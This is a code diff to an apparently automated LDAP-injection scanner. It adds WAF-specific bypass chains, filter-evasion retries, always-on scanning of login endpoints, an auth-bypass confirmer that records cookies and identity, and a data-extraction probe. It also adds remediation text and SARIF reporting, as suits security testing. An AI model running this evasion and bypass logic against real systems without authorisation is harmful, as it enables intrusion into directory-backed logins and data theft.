             return []
 
-        if downgrade and grade == VerificationGrade.CONFIRMED:
-            grade = VerificationGrade.PROBABLE
+        # FP filter — skip for fast-path confirmed (direct LDAP error = no FP)
+        is_fast_path = v_result.get("fast_path", False)
+        if not is_fast_path:
+            fp_ok, downgrade, fp_reasons = self._fp.validate(
+                ep=ep, param=param, payload=payload,
+                baseline=baseline, result=result,
+                inj_body=resp.text or "",
+                replay_hits=v_result["step3_hits"],
+                control_body=ctrl_body,
+            )
+            if not fp_ok:
+                verbose(f"  FP filtered: {fp_reasons[-1] if fp_reasons else 'unknown'}")
+                with self._lock:
+                    self._fp_count += 1
+                return []
+
+            if downgrade and grade == VerificationGrade.CONFIRMED:
+                grade = VerificationGrade.PROBABLE
+        else:
+            # Fast-path: FP filter skipped (direct evidence is conclusive)
+            verbose(f"  [E1] Fast-path: FP filter skipped for direct signal")
 
         hf = self._build_handoff_finding(
             ep=ep, param=param, pl=payload,
@@ -7793,16 +8153,26 @@ class InjectionEngine:
         self, ep: Endpoint, param: str,
         baseline: Baseline,
         server_type: str, framework: str,
-        t0_signals_fired: bool = False
+        t0_signals_fired: bool = False,
+        boundary: Optional[Dict[str, Any]] = None
     ) -> Tuple[List[HandoffFinding], List[InconclusiveFinding]]:
-        """V12: Run Tier 1 with TargetProfilerEngine + DynamicPayloadRefiner."""
-        # V12: Profile target before injection to determine strategy
+        """[V15 E5] Run Tier 1 with TargetProfilerEngine + autonomous method priority."""
         tpe_profile = None
         payload_limit = self._cfg.max_payloads_tier1
         try:
             tpe_profile  = self._tpe.profile(ep, param, baseline)
             payload_limit = self._tpe.strategy_payload_limit(tpe_profile)
             vprint(f"  [TPE] {ep.url}:{param} strategy={tpe_profile.strategy} limit={payload_limit}")
+
+            # [V15 E5] Autonomous method priority: if TPE says error_visible,
+            # surface to operator so they know error-based will be tried first.
+            strat = getattr(tpe_profile, "strategy", None)
+            if strat == "error":
+                verbose(f"  [E5] Auto-strategy: error-based priority (errors visible on target)")
+            elif strat == "boolean":
+                verbose(f"  [E5] Auto-strategy: blind-boolean priority (stable responses, errors hidden)")
+            elif strat == "timing":
+                verbose(f"  [E5] Auto-strategy: timing priority (volatile responses, errors hidden)")
         except Exception:
             pass
 
@@ -7849,7 +8219,16 @@ class InjectionEngine:
 
         consecutive_blocks = 0
         for pl in payloads:
-            if self._memory.should_skip(pl.raw):
+            # Dynamically adapt payload structure to solved boundary depth
+            pl_to_send = pl
+            if boundary and boundary.get('solved'):
+                adapted_raw = adapt_payload_to_boundary(pl.raw, boundary)
+                if adapted_raw != pl.raw:
+                    pl_to_send = copy.copy(pl)
+                    pl_to_send.raw = adapted_raw
+                    pl_to_send.desc = f"{pl.desc} [balanced depth {boundary['depth']}]"
+
+            if self._memory.should_skip(pl_to_send.raw):
                 continue
 
             # Circuit Breaker
@@ -7860,7 +8239,7 @@ class InjectionEngine:
             if not self._budget.acquire_injection():
                 break
 
-            data = build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix)
+            data = build_injection_data(ep, param, pl_to_send.raw, self._cfg.deterministic_suffix)
             resp = self._client.send_endpoint(ep, data, phase="injection")
             if resp is None: continue
 
@@ -7871,9 +8250,9 @@ class InjectionEngine:
                 consecutive_blocks = 0
 
             # OOB check
-            oob_hit = bool(self._oob and self._oob.triggered() and pl.tier == PayloadTier.TIER4_OOB)
+            oob_hit = bool(self._oob and self._oob.triggered() and pl_to_send.tier == PayloadTier.TIER4_OOB)
 
-            result = self._pipeline.run(resp, baseline, pl, oob_triggered=oob_hit)
+            result = self._pipeline.run(resp, baseline, pl_to_send, oob_triggered=oob_hit)
 
             # Auth redirect detection
             if not result.fired and ep.is_auth_ep:
@@ -7887,13 +8266,13 @@ class InjectionEngine:
                     resp = resp_nf
 
             if not result.fired:
-                self._memory.mark_failure(ep.url, pl.raw)
+                self._memory.mark_failure(ep.url, pl_to_send.raw)
                 if resp.status_code in (403, 406, 429): waf_triggered = True
                 continue
 
             # Signal fired: verified processing
             res_found = self._handle_signal(
-                ep=ep, param=param, payload=pl, baseline=baseline,
+                ep=ep, param=param, payload=pl_to_send, baseline=baseline,
                 result=result, resp=resp, server_type=server_type, framework=framework)
             found.extend(res_found)
 
@@ -7903,20 +8282,20 @@ class InjectionEngine:
                 cookies = {c.name: c.value for c in resp.cookies}
                 csrf = self._client.csrf_manager.get_tokens()
                 marker = self._state_tracker.record_injection(
-                    ep, param, pl.raw, pl.technique, cookies, csrf)
+                    ep, param, pl_to_send.raw, pl_to_send.technique, cookies, csrf)
                 verbose(f"  [State] Recorded confirmed injection marker={marker}")
 
             # V6 Enhancement 4: Polymorphic WAF bypass generation
             if waf_triggered or self._client.waf_detected:
                 # Use PolymorphicPayloadGenerator for richer bypass variants
                 poly_variants = self._poly_gen.generate(
-                    pl,
+                    pl_to_send,
                     self._client._survived_chars,
                     waf_name=self._client.waf_name or "Generic",
                     rounds=8,
                 )
                 # Also include classic Tier3 for backward compatibility
-                t3 = PayloadEngine.build_tier3_waf(pl, self._client._survived_chars)
+                t3 = PayloadEngine.build_tier3_waf(pl_to_send, self._client._survived_chars)
                 secondary_sweep.extend(poly_variants)
                 secondary_sweep.extend(t3)
                 verbose(f"  [WAF] Queued {len(poly_variants)} poly + {len(t3)} T3 bypass variants")
@@ -7924,15 +8303,15 @@ class InjectionEngine:
             # Emit InconclusiveFinding when WAF blocks confirmations
             if result.fired and not res_found and self._client.waf_detected:
                 # Generate header injection recommendations from poly generator
-                header_hints = list(PolymorphicPayloadGenerator.header_injection_variants(pl.raw).keys())
+                header_hints = list(PolymorphicPayloadGenerator.header_injection_variants(pl_to_send.raw).keys())
                 inconclusive = InconclusiveFinding(
                     endpoint_url   = ep.url,
                     parameter_name = param,
                     signal_fired   = result.signals[0].detector if result.signals else "unknown",
                     reason         = f"WAF ({self._client.waf_name}) blocked all confirmation payloads",
-                    payloads_tried = [pl.raw],
+                    payloads_tried = [pl_to_send.raw],
                     recommendation = (
-                        f"Manual verification: inject {pl.raw!r} via Burp Suite "
+                        f"Manual verification: inject {pl_to_send.raw!r} via Burp Suite "
                         f"with WAF bypass encoding. Target: {ep.url} param: {param}. "
                         f"Also try header injection via: {', '.join(header_hints[:3])}"
                     ),
@@ -7954,6 +8333,24 @@ class InjectionEngine:
                 found.extend(self._handle_signal(ep, param, pl, baseline, result, resp,
                                                   is_header=False, server_type=server_type,
                                                   framework=framework))
+
+        # V13: Filter Evasion — if WAF detected and no confirmed finding, try encoded variants
+        if not found and self._client.waf_detected:
+            base_payloads = [pl.raw for pl in payloads[:5] if pl.tier == PayloadTier.TIER1_CORE]
+            evasion_pls   = FilterEvasionEncoder.evasion_payload_objects(base_payloads)
+            for epl in evasion_pls[:8]:
+                if not self._budget.acquire_injection(): break
+                data = build_injection_data(ep, param, epl.raw, self._cfg.deterministic_suffix)
+                resp = self._client.send_endpoint(ep, data, phase="injection")
+                if resp is None: continue
+                result = self._pipeline.run(resp, baseline, epl)
+                if result.fired:
+                    found.extend(self._handle_signal(
+                        ep, param, epl, baseline, result, resp,
+                        is_header=False, server_type=server_type, framework=framework))
+                    if any(f.verification_grade == VerificationGrade.CONFIRMED.value
+                           for f in found):
+                        break
                 if any(f.verification_grade == VerificationGrade.CONFIRMED.value for f in found):
                     break
 
@@ -8151,6 +8548,13 @@ class InjectionEngine:
                 sev = Severity.MEDIUM
                 sev_reason += " (grade-lifted)"
 
+        # ── [E9] V15: Method-based confidence override ───────────────────────
+        # Use the higher of score-based confidence and method-based confidence.
+        v_method = v_result.get("method", "unknown")
+        method_conf = METHOD_CONFIDENCE.get(v_method, 50)
+        base_conf   = v_result.get("confidence", 0)
+        final_conf  = max(base_conf, method_conf) if grade != VerificationGrade.REJECTED else 0
+
         # ── Fix: correct diff_ratio ──────────────────────────────────────────
         bl            = self._baselines.get(ep.key)
         diff_ratio    = sim_delta(bl.body, inj_body) if (bl and inj_body) else 0.0
@@ -8208,7 +8612,7 @@ class InjectionEngine:
             payload_tier            = pl.tier.name,
             verification_grade      = grade.value,
             verification_steps      = v_result.get("proof", []),
-            reproduction_confidence = v_result.get("confidence", 0),
+            reproduction_confidence = final_conf,   # [E9] method-based confidence
             severity                = sev.name,
             severity_reason         = sev_reason,
             baseline_response_class = bl_resp_class,
@@ -8238,6 +8642,8 @@ class InjectionEngine:
             second_order            = result.second_order,
             affected_ldap_attributes = [],
             schema_enumerated       = False,
+            # [E9] Detection method used for this finding
+            impact_scenario         = f"Detection method: {v_method} | Confidence: {final_conf}%",
         )
 
     def scan_endpoint(
@@ -8266,9 +8672,15 @@ class InjectionEngine:
                 if hit and res:
                     qualified_params.append((param, res))
             
+            # [E3] V15: If T0 missed but endpoint is auth, promote all params anyway.
+            # Auth endpoints are highest priority targets — never gate them out.
             if not qualified_params:
-                verbose(f"  T0 gate: no signal across {len(ep.params)} params at {ep.url} — skipping")
-                return ([], [])  # FIXED: Return tuple instead of empty list
+                if ep.is_auth_ep:
+                    verbose(f"  [V15-E3] T0 gate missed but auth endpoint — promoting all params")
+                    qualified_params = [(p, None) for p in ep.params[:12]]
+                else:
+                    verbose(f"  T0 gate: no signal across {len(ep.params)} params at {ep.url} — skipping")
+                    return ([], [])
         else:
             # Force scan: all params qualify
             qualified_params = [(p, None) for p in ep.params[:12]]
@@ -8284,12 +8696,33 @@ class InjectionEngine:
         
         all_inconclusives: List[InconclusiveFinding] = []
 
+        # V15 [E3]: Lowered ldap_prob floor from 15 → 5 so broad class of endpoints
+        # (non-auth, unknown prob) still enter the injection pipeline.
+        # Auth endpoints always scan regardless of ldap_prob.
+        ldap_port_confirmed = bool(getattr(self._cfg, '_ldap_ports_confirmed', []))
+        if ep.ldap_prob < 5 and not ep.is_auth_ep and not ldap_port_confirmed:
+            return [], []
+
+        # V14: Credential Stuffing Oracle — confirm LDAP backend on auth endpoints
+        if ep.is_auth_ep and len(ep.params) >= 2:
+            user_p = next((p for p in ep.params if any(
+                t in p.lower() for t in ["user","login","email","uid","account"])), ep.params[0])
+            pass_p = next((p for p in ep.params if any(
+                t in p.lower() for t in ["pass","pwd","password","secret"])), ep.params[-1])
+            if user_p != pass_p:
+                cso_result = self._cso.probe(ep, user_p, pass_p)
+                if cso_result["ldap_backend_confirmed"]:
+                    ep.ldap_prob = min(ep.ldap_prob + 25, 95)
+                    self._memory.record_success(ep.url)
+
         # 1. Full Tier 1 injection for qualified params
         for param, t0_res in qualified_params:
+            boundary = self._pbs.solve(ep, param, baseline)
             t1_found, t1_inc = self._run_tier1_param(
                 ep=ep, param=param, baseline=baseline,
                 server_type=server_type, framework=framework,
-                t0_signals_fired=(t0_res is not None))
+                t0_signals_fired=(t0_res is not None),
+                boundary=boundary)
             all_found.extend(t1_found)
             all_inconclusives.extend(t1_inc)
 
@@ -8309,6 +8742,38 @@ class InjectionEngine:
                         cf.verification_steps.append(
                             f"cross_param: {len(cpv['sibling_anomalies'])} sibling anomalies confirmed")
                         vprint(f"  [CrossParam] Confirmed via {len(cpv['sibling_anomalies'])} siblings on {ep.url}")
+
+            # V13 — State Validator: confirm auth bypass on CONFIRMED auth-ep findings
+            for cf in confirmed_here:
+                if ep.is_auth_ep or "bypass" in cf.payload_technique.lower():
+                    sv_result = self._sv.validate(
+                        ep=ep, param=param,
+                        payload=cf.payload_raw,
+                        baseline_body=baseline.body or "",
+                        cfg=self._cfg)
+                    if sv_result.confirmed_bypass:
+                        cf.verification_steps.append(
+                            f"state_validator: AUTH_BYPASS_CONFIRMED "
+                            f"cookies={sv_result.new_cookies} "
+                            f"identity={sv_result.identity}")
+                        cf.reproduction_confidence = min(
+                            cf.reproduction_confidence + 15, 100)
+                        cf.exploiter_context["is_auth_bypass"] = True
+                        info(f"  [StateValidator] Auth bypass confirmed: {sv_result.narrative}")
+
+            # V13+V14 — DataExtractionProbe on CONFIRMED findings (gated behind --extract)
+            if confirmed_here and self._dep_engine and self._cfg.extract:
+                dep_result = self._dep_engine.probe(ep, param, baseline)
+                if dep_result["extraction_confidence"] > 0:
+                    for cf in confirmed_here:
+                        cf.verification_steps.append(
+                            f"data_extraction: conf={dep_result['extraction_confidence']}% "
+                            f"attr_triggered={[x['filter'] for x in dep_result['attr_triggered']]} "
+                            f"enum_chars={dep_result['enum_chars']}")
+                        cf.exploiter_context = cf.exploiter_context or {}
+                        cf.exploiter_context["data_extraction"] = dep_result
+                    info(f"  [DataExtraction] {dep_result['extraction_confidence']}% "
+                         f"confidence, {len(dep_result['enum_chars'])} enumerable chars")
 
             # V11 — Early exit: once a param is CONFIRMED injectable, skip remaining params
             if (confirmed_here and not self._cfg.force_scan
@@ -8656,6 +9121,34 @@ class FindingDeduplicator:
         return result
 
 
+def _remediation_for_finding(f: "HandoffFinding") -> str:
+    """V14: Framework-specific remediation templates."""
+    fw  = (f.framework_detected or "generic").lower()
+    sev = (f.severity or "medium").lower()
+    base = "Sanitize all LDAP filter inputs before passing to directory queries. "
+    if "spring" in fw:
+        base += ("Spring LDAP: use LdapTemplate with Spring's LdapEncoder.filterEncode() "
+                 "on all user-supplied filter components.")
+    elif "django" in fw:
+        base += ("Django: use python-ldap3's escape_filter_chars() or the ldap3 library's "
+                 "Connection.search() with escape_filter_chars applied to all inputs.")
+    elif "node" in fw or "express" in fw:
+        base += ("Node.js: use the ldapjs library's ldap.parseFilter() + attribute "
+                 "sanitization, or the ldap-escape npm package on all filter values.")
+    elif "php" in fw:
+        base += ("PHP: use ldap_escape() (PHP 5.6+) with LDAP_ESCAPE_FILTER on all "
+                 "user-controlled values before constructing LDAP filters.")
+    elif "ad" in (f.ldap_server_type or "").lower():
+        base += ("Active Directory: enforce LdapConnectionOptions.ReferralChasing=ReferralChasingOption.None, "
+                 "use DirectorySearcher with strongly-typed filter construction.")
+    else:
+        base += "Use parameterized directory queries or an LDAP abstraction layer with input escaping."
+    if sev in ("critical", "high"):
+        base += " Deploy WAF rule to block LDAP metacharacters: *, (, ), backslash, NUL, |, &."
+    return base
+
+
+
 class HandoffSerializer:
     """
     V12 — Structured JSON output matching enterprise handoff format.
@@ -8788,8 +9281,7 @@ class HandoffSerializer:
             "observation":      self._build_observation(f),
             "proof_of_concept": f.curl_poc,
             "remediation":      (f.remediation_guidance or
-                                 "Sanitize LDAP inputs; use parameterized directory queries; "
-                                 "enforce input whitelisting on all directory-backed parameters."),
+                             _remediation_for_finding(f)),
             "cve_reference":    None,
             "severity_reason":  f.severity_reason,
             "impact":           impact_block,
@@ -8841,6 +9333,60 @@ class HandoffSerializer:
             },
         }
 
+
+    @staticmethod
+    def _to_sarif(doc: Dict, cfg: "ScanConfig") -> Dict:
+        """V14: Emit SARIF 2.1.0 format for GitHub Advanced Security / Azure DevOps."""
+        rules = []
+        results = []
+        seen_rules: set = set()
+        for f in doc.get("findings", []):
+            rule_id = f"LDAPI-{f.get('vulnerability_type','INJECTION').upper().replace(' ','_')[:30]}"
+            if rule_id not in seen_rules:
+                seen_rules.add(rule_id)
+                rules.append({
+                    "id": rule_id,
+                    "name": f.get("vulnerability_type","LDAPInjection"),
+                    "shortDescription": {"text": f.get("description","")[:100]},
+                    "fullDescription": {"text": f.get("description","")},
+                    "defaultConfiguration": {"level": (
+                        "error" if f.get("severity") in ("critical","high")
+                        else "warning" if f.get("severity") == "medium"
+                        else "note")},
+                    "helpUri": "https://owasp.org/www-community/attacks/LDAP_Injection",
+                    "help": {"text": f.get("remediation","")},
+                })
+            uri = f.get("target_url","").replace(cfg.target,"").lstrip("/") or "/"
+            results.append({
+                "ruleId": rule_id,
+                "level": ("error" if f.get("severity") in ("critical","high")
+                           else "warning" if f.get("severity") == "medium"
+                           else "note"),
+                "message": {"text": f.get("observation","")[:200]},
+                "locations": [{"physicalLocation": {
+                    "artifactLocation": {"uri": uri},
+                    "region": {"startLine": 1}
+                }}],
+                "properties": {
+                    "parameter":   f.get("affected_parameter",""),
+                    "confidence":  f.get("confidence_score", 0),
+                    "grade":       f.get("verification_grade",""),
+                    "poc":         f.get("proof_of_concept","")[:300],
+                },
+            })
+        return {
+            "version": "2.1.0",
+            "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0.json",
+            "runs": [{
+                "tool": {"driver": {
+                    "name": TOOL_NAME, "version": VERSION,
+                    "rules": rules,
+                    "informationUri": "https://github.com/ldapi-agent",
+                }},
+                "results": results,
+            }]
+        }
+
     def emit(
         self,
         handoff:         "ScanHandoff",
@@ -8865,6 +9411,29 @@ class HandoffSerializer:
                 all_findings.append(self._raw_ldap_to_v12(rf))
             except Exception as exc:
                 errors.append(f"raw_ldap_serialize:{rf.host}:{exc}")
+
+        # V14: Deduplicate findings by (normalized_url, param, technique_family)
+        # Merge unauth + auth variants into single finding with auth_state="both"
+        _seen: Dict[str, int] = {}
+        _deduped: List[Dict] = []
+        for fdict in all_findings:
+            key = f"{fdict.get('target_url','').split('?')[0]}:{fdict.get('affected_parameter','')}:{fdict.get('category','')}"
+            if key in _seen:
+                existing = _deduped[_seen[key]]
+                # Merge: keep highest confidence, mark auth_state="both"
+                if fdict.get("confidence_score", 0) > existing.get("confidence_score", 0):
+                    existing["confidence_score"] = fdict["confidence_score"]
+                    existing["confidence"]       = fdict["confidence"]
+                    existing["verification_grade"] = fdict.get("verification_grade", existing["verification_grade"])
+                existing_auth = existing.get("details", {}).get("param_location", "")
+                new_auth      = fdict.get("details", {}).get("param_location", "")
+                if existing_auth != new_auth:
+                    existing["auth_state_coverage"] = "both"
+                    existing.setdefault("alternative_pocs", []).append(fdict.get("proof_of_concept",""))
+            else:
+                _seen[key] = len(_deduped)
+                _deduped.append(fdict)
+        all_findings = _deduped
 
         # Sort by severity order
         _sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
@@ -8906,6 +9475,10 @@ class HandoffSerializer:
                 "target_live":              handoff.target_live,
                 "dns_resolved":             handoff.target_dns_resolved,
                 "open_ports":               handoff.target_ports_open,
+                "anonymous_bind_detected":  getattr(handoff, "anonymous_bind_detected", False),
+                "cdn_detected":             getattr(handoff, "cdn_detected", False),
+                "cdn_provider":             getattr(handoff, "cdn_provider", ""),
+                "ntlm_kerberos_detected":   getattr(handoff, "ntlm_kerberos_detected", False),
             },
 
             "discovery": {
@@ -8944,9 +9517,19 @@ class HandoffSerializer:
             "findings": all_findings,
         }
 
-        out_path = os.path.join(self._cfg.output_dir, self._cfg.findings_file)
+        # V14: findings_file is now properly resolved via __post_init__
+        findings_name = self._cfg.findings_file.replace("{scan_id}", self._cfg.scan_id)
+        out_path = os.path.join(self._cfg.output_dir, findings_name)
         with open(out_path, "w", encoding="utf-8") as fh:
             json.dump(doc, fh, indent=2, default=str)
+
+        # V14: SARIF output if requested
+        if self._cfg.output_format == "sarif":
+            sarif_path = out_path.replace(".json", ".sarif.json")
+            sarif_doc  = self._to_sarif(doc, self._cfg)
+            with open(sarif_path, "w", encoding="utf-8") as fh:
+                json.dump(sarif_doc, fh, indent=2)
+            info(f"  SARIF output: {sarif_path}")
 
         return out_path
 
@@ -8975,19 +9558,40 @@ class ScanSessionLogger:
         rid = (request_id
                or getattr(self._current_request_id, 'id', None)
                or "default")
+
+        # [V15 E6] Sanitize: strip any response body / sensitive fields
+        # to prevent PII, session tokens, or full HTML from appearing in audit log.
+        _SENSITIVE_KEYS = {
+            "response_body", "body", "resp_text", "raw_response",
+            "response_headers", "cookies", "set_cookie",
+        }
+        safe_data = {
+            k: ("[REDACTED-E6]" if k.lower() in _SENSITIVE_KEYS else v)
+            for k, v in data.items()
+        }
+        # Also truncate any string value over 500 chars (prevents accidental leak)
+        safe_data = {
+            k: (v[:500] + "…[truncated]" if isinstance(v, str) and len(v) > 500 else v)
+            for k, v in safe_data.items()
+        }
+
         entry = {
             "ts":         now_iso(),
             "seq":        self._seq,
             "event":      event,
             "request_id": rid,
             "narrative":  narrative,
-            **data,
+            **safe_data,
         }
         try:
             with self._lock:
                 self._seq += 1
+                # [E6] json.dumps with ensure_ascii to prevent unicode injection
+                line = json.dumps(entry, default=str, ensure_ascii=True)
+                # [E6] Ensure no embedded newlines break NDJSON format
+                line = line.replace("\n", "\\n").replace("\r", "\\r")
                 with open(self._path, "a", encoding="utf-8") as fh:
-                    fh.write(json.dumps(entry, default=str) + "\n")
+                    fh.write(line + "\n")
         except Exception:
             pass
 
@@ -10007,6 +10611,17 @@ class ChainedPayloadMutator:
             ["unicode_star", "unicode_lparen", "url"],
             ["double_struct"],
         ],
+        "Imperva": [
+            ["char_encode", "double_url"],
+            ["unicode_star", "double_url"],
+        ],
+        "AWS_WAF": [
+            ["double_struct"],
+            ["char_encode", "url"],
+        ],
+        "F5_BIGIP": [
+            ["unicode_star", "unicode_lparen", "url"],
+        ],
         "generic": [
             ["char_encode"],
             ["double_url"],
@@ -10040,8 +10655,16 @@ class ChainedPayloadMutator:
         Generate N mutated variants of a payload using WAF-driven chains.
         Returns list of Payload objects with encoded_already=True.
         """
-        waf_key = waf_name or self._memory.waf_name or "generic"
-        chains  = self._WAF_CHAINS.get(waf_key, self._WAF_CHAINS["generic"])
+        waf_key = (waf_name or self._memory.waf_name or "generic").lower()
+        
+        # Match case-insensitively and support substring lookup
+        chains = None
+        for k, v in self._WAF_CHAINS.items():
+            if k.lower() in waf_key or waf_key in k.lower():
+                chains = v
+                break
+        if chains is None:
+            chains = self._WAF_CHAINS["generic"]
 
         # Prefer chains using survived chars
         top_encs = self._memory.top_encodings(3)
@@ -10258,14 +10881,18 @@ class CrossEndpointCorrelator:
 
         # Pattern 1: Same param injectable in multiple endpoints
         for param, urls in self._ep_by_param.items():
-            if len(urls) >= 2:
+            unique_urls = list(dict.fromkeys(urls))
+            if len(unique_urls) >= 2:
+                # V14: Confidence amplification — same payload on 3+ endpoints = +15 confidence
+                conf_boost = 15 if len(unique_urls) >= 3 else 8
                 correlations.append({
-                    "type":        "multi_endpoint_param",
-                    "param":       param,
-                    "endpoints":   list(dict.fromkeys(urls)),
+                    "type":           "multi_endpoint_param",
+                    "param":          param,
+                    "endpoints":      unique_urls,
+                    "confidence_boost": conf_boost,
                     "description": (
                         f"Parameter '{param}' is injectable across "
-                        f"{len(urls)} endpoints — potential stored injection chain"
+                        f"{len(unique_urls)} endpoints — confidence boost +{conf_boost}%"
                     ),
                     "severity":    "HIGH",
                 })
@@ -10955,7 +11582,7 @@ class FeedbackDrivenDiscovery:
         data = {p: (probe_val if i == 0 else safe_val(p))
                 for i, p in enumerate(ep.params[:3])}
 
-        before_cookies: Set[str] = set(self._client._session.cookies.keys())
+        before_cookies: Set[str] = set(self._client._get_session(AuthState.UNAUTH).cookies.keys())
         t0 = time.monotonic()
 
         resp = self._client.send_endpoint(ep, data, phase="tier0")
@@ -10964,8 +11591,7 @@ class FeedbackDrivenDiscovery:
             return score
 
         elapsed = time.monotonic() - t0
-        after_cookies: Set[str] = set(resp.cookies.keys()) | set(
-            self._client._session.cookies.keys())
+        after_cookies: Set[str] = set(resp.cookies.keys()) | set(self._client._get_session(AuthState.UNAUTH).cookies.keys())
 
         body = resp.text or ""
 
@@ -11222,7 +11848,7 @@ class TargetProfilerEngine:
         profile.sanitizes_parens   = "(" not in safe_chars and ")" not in safe_chars
 
         # ── Probe 4: Session sensitivity ─────────────────────────────────────
-        before  = set(self._client._session.cookies.keys())
+        before  = set(self._client._get_session(AuthState.UNAUTH).cookies.keys())
         inj_dat = build_injection_data(ep, param, "*", self._cfg.deterministic_suffix)
         resp4   = self._client.send_endpoint(ep, inj_dat, phase="tier0")
         if resp4:
@@ -11343,6 +11969,828 @@ class ExploitValidator:
             notes.append(f"Validation FAILED: downgraded to CANDIDATE ({hits}/{self._REPLAY_COUNT})")
 
         return grade, confidence, notes
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-DNS  PASSIVE DNS ENUMERATOR — Phase 1 silent pre-scan
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class PassiveDNSEnumerator:
+    """V13 — Query A/AAAA/MX/NS/CNAME/TXT/SRV before any active probe. Confidence=85."""
+    _RDTYPES   = ["A", "AAAA", "MX", "NS", "CNAME", "TXT", "SRV", "SOA"]
+    _SRV_NAMES = ["_ldap._tcp", "_ldaps._tcp", "_gc._tcp",
+                  "_kerberos._tcp", "_http._tcp", "_https._tcp"]
+    _PORT_MAP  = {"A":[80,443], "AAAA":[80,443], "MX":[25,465,587], "NS":[53]}
+    _CONF      = 85
+
+    def __init__(self, domain: str, registry: "EndpointDeduplicationRegistry"):
+        self._domain   = domain
+        self._registry = registry
+        self._results: List[Dict] = []
+
+    def enumerate(self) -> List[Dict]:
+        try:
+            import dns.resolver as _res
+            resolver           = _res.Resolver()
+            resolver.timeout   = 4
+            resolver.lifetime  = 6
+        except ImportError:
+            warn("dnspython not installed — passive DNS skipped (pip install dnspython)")
+            return []
+
+        host = self._domain
+        for rtype in self._RDTYPES:
+            try:
+                answers = resolver.resolve(host, rtype, raise_on_no_answer=False)
+                for rdata in answers:
+                    rdstr = rdata.to_text()
+                    for p in self._PORT_MAP.get(rtype, []):
+                        self._registry.register(
+                            rdstr.rstrip("."), p, f"DNS_{rtype}",
+                            {"origin": "passive_dns", "record": rdstr},
+                            confidence=self._CONF)
+                    self._results.append({"type": rtype, "value": rdstr})
+            except Exception:
+                pass
+
+        for srv in self._SRV_NAMES:
+            try:
+                import dns.resolver as _res
+                answers = _res.resolve(f"{srv}.{host}", "SRV",
+                                       raise_on_no_answer=False)
+                for rdata in answers:
+                    target = rdata.target.to_text().rstrip(".")
+                    port   = int(rdata.port)
+                    proto  = "LDAPS" if "ldaps" in srv or port == 636 else "LDAP"
+                    self._registry.register(
+                        target, port, proto,
+                        {"srv": srv, "priority": rdata.priority, "origin": "srv_dns"},
+                        confidence=90)
+                    self._results.append({"type":"SRV","target":target,"port":port})
+            except Exception:
+                pass
+
+        info(f"  [PassiveDNS] {len(self._results)} DNS records — {host}")
+        return self._results
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-CT   CERT TRANSPARENCY FETCHER — Phase 1 subdomain discovery via crt.sh
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class CertTransparencyFetcher:
+    """V13 — Query crt.sh for certificate transparency logs. Confidence=80."""
+    _API     = "https://crt.sh/?q=%.{domain}&output=json"
+    _TIMEOUT = 10
+
+    def __init__(self, domain: str, registry: "EndpointDeduplicationRegistry",
+                 session: requests.Session):
+        self._domain   = domain
+        self._registry = registry
+        self._session  = session
+
+    def fetch(self) -> List[str]:
+        url = self._API.format(domain=self._domain)
+        try:
+            resp  = self._session.get(url, timeout=self._TIMEOUT, verify=True)
+            if resp.status_code != 200:
+                return []
+            entries = resp.json()
+        except Exception as exc:
+            warn(f"  [CertTransparency] crt.sh failed: {exc}")
+            return []
+
+        seen: Set[str] = set()
+        out:  List[str] = []
+        for e in entries:
+            for hn in e.get("name_value", "").splitlines():
+                hn = hn.strip().lstrip("*.")
+                if hn and hn not in seen and self._domain in hn:
+                    seen.add(hn)
+                    out.append(hn)
+                    self._registry.register(
+                        hn, 443, "HTTPS",
+                        {"source":"cert_transparency",
+                         "not_before": e.get("not_before","")},
+                        confidence=80)
+                    self._registry.register(
+                        hn, 80, "HTTP",
+                        {"source":"cert_transparency"}, confidence=75)
+        info(f"  [CertTransparency] {len(out)} hostnames via crt.sh — {self._domain}")
+        return out
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-REG  ENDPOINT DEDUPLICATION REGISTRY — Hash-keyed cross-phase asset store
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class EndpointDeduplicationRegistry:
+    """V13 — sha1(ip:port:protocol) keyed. On collision, merges not duplicates."""
+
+    @dataclass
+    class AssetRecord:
+        ip:         str
+        port:       int
+        protocol:   str
+        confidence: int
+        metadata:   Dict      = field(default_factory=dict)
+        sources:    List[str] = field(default_factory=list)
+
+    def __init__(self):
+        self._store: Dict[str, "EndpointDeduplicationRegistry.AssetRecord"] = {}
+        self._lock  = threading.Lock()
+
+    @staticmethod
+    def _key(ip: str, port: int, protocol: str) -> str:
+        import hashlib
+        return hashlib.sha1(
+            f"{ip.lower().rstrip('.')}:{port}:{protocol.upper()}".encode()
+        ).hexdigest()[:16]
+
+    def register(self, ip: str, port: int, protocol: str,
+                 metadata: Dict, confidence: int = 50) -> str:
+        key = self._key(ip, port, protocol)
+        with self._lock:
+            if key in self._store:
+                rec             = self._store[key]
+                rec.confidence  = max(rec.confidence, confidence)
+                for k, v in metadata.items():
+                    rec.metadata.setdefault(k, v)
+                src = metadata.get("source") or metadata.get("origin", "")
+                if src and src not in rec.sources:
+                    rec.sources.append(src)
+            else:
+                src = metadata.get("source") or metadata.get("origin", "")
+                self._store[key] = self.AssetRecord(
+                    ip=ip, port=port, protocol=protocol,
+                    confidence=confidence, metadata=dict(metadata),
+                    sources=[src] if src else [])
+        return key
+
+    def all_records(self) -> List["EndpointDeduplicationRegistry.AssetRecord"]:
+        with self._lock:
+            return list(self._store.values())
+
+    def summary(self) -> Dict:
+        recs = self.all_records()
+        return {
+            "total":        len(recs),
+            "high_conf":    sum(1 for r in recs if r.confidence >= 80),
+            "ldap_entries": sum(1 for r in recs
+                                if r.protocol.upper() in ("LDAP","LDAPS","LDAP_GC")),
+        }
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V13-AST  ADAPTIVE SCAN THROTTLER — Rolling error-rate auto-throttle
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class AdaptiveScanThrottler:
+    """V13 — 10-probe rolling window. >30% error rate → halve delay + jitter."""
+    _WINDOW      = 10
+    _THROTTLE_AT = 0.30
+    _HEAL_AT     = 0.10
+
+    def __init__(self, base_delay: float = 0.0):
+        self._base_delay    = base_delay
+        self._current_delay = base_delay
+        self._window:       deque = deque(maxlen=self._WINDOW)
